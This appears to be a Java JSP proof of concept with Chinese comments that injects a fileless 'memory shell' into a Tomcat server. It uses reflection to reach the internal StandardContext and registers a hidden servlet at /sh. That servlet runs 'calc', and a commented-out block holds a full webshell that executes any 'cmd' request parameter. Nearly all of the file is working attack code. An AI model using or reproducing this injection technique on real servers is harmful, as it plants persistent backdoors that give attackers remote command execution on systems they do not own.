<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Wrapper" %><%--
  Created by IntelliJ IDEA.
  User: 鄢永炬
  Date: 2024/3/3
  Time: 15:48
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Servlet</title>
</head>
<body>
<%!
    //jsp定义或者声明需要加上！
    public class CmdServlet extends HttpServlet {
        @Override
        public void init(ServletConfig servletConfig){

        }

        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
//            String cmd = servletRequest.getParameter("cmd");
//            if(cmd!=null){
//                try {
//                    Runtime.getRuntime().exec(cmd);
//                } catch (IOException e) {
//                    throw new RuntimeException(e);
//                }
//            }
            try {
                Runtime.getRuntime().exec("calc");
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {

        }
    }
%>

<%
    //动态注册
    //1.获取StandardContext对象
    ServletContext servletContext = request.getServletContext();

    System.out.println(servletContext);
    //反射获取ApplicationContext类型的属性context
    Field applicationContextField =  servletContext.getClass().getDeclaredField("context");
    applicationContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
    //反射获取StandardContext类型的属性context
    Field contextField = applicationContext.getClass().getDeclaredField("context");
    contextField.setAccessible(true);
    StandardContext context = (StandardContext) contextField.get(applicationContext);
%>


<%

    //2.注册进入context
    //根据ContextConfig#configureContext方法注册servlet
    //对应着xml配置文件配置Servlet
    //设置名称和类
    Wrapper wrapper = context.createWrapper();
    wrapper.setName("test");
    wrapper.setLoadOnStartup(1);
    wrapper.setServletClass(CmdServlet.class.getName());
    wrapper.setServlet(new CmdServlet());
    //设置映射路径
    context.addChild(wrapper);
    context.addServletMappingDecoded("/sh","test");
%>
成功注入内存马，路径: <a href="sh">/sh</a>

</body>
</html>
